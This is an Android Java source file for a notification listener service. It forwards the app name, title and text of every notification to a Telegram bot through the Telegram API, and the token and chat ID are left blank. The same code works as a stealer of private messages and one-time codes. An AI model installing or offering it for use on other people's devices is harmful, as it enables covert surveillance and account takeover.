package com.example.notification;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;

import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Locale;

public class MyNotificationListener extends NotificationListenerService {
    private static final String BOT_TOKEN = "";
    private static final String CHAT_ID = "";

    @Override
    public void onCreate() {
        super.onCreate();

        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    "notification_service",
                    "Notification Service",
                    NotificationManager.IMPORTANCE_LOW
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }

            Notification notification = new Notification.Builder(this, "notification_service")
                    .setContentTitle("Notification Listener Running")
                    .setSmallIcon(R.mipmap.ic_launcher)
                    .build();

            startForeground(1, notification); // Runs service in the foreground
        }
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn) {
        if (sbn == null) return;

        String packageName = sbn.getPackageName();
        Notification notification = sbn.getNotification();
        if (notification == null) return;

        CharSequence title = notification.extras.getCharSequence(Notification.EXTRA_TITLE);
        CharSequence text = notification.extras.getCharSequence(Notification.EXTRA_TEXT);

        if (title != null && text != null) {
            String message = String.format(Locale.US,
                    "📩 *New Notification!*\n" +
                            "🔹 *App:* %s\n" +
                            "🔹 *Title:* %s\n" +
                            "🔹 *Content:* %s",
                    packageName, title.toString(), text.toString());

            sendToTelegram(message);
        }
    }

    private void sendToTelegram(String message) {
        new Thread(() -> {
            try {
                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
                conn.setDoOutput(true);

                String data = "chat_id=" + CHAT_ID + "&text=" + message + "&parse_mode=Markdown";
                OutputStream os = conn.getOutputStream();
                os.write(data.getBytes());
                os.flush();
                os.close();

                conn.getResponseCode();
            } catch (Exception e) {
                Log.e("Telegram", "Error sending message", e);
            }
        }).start();
    }
}
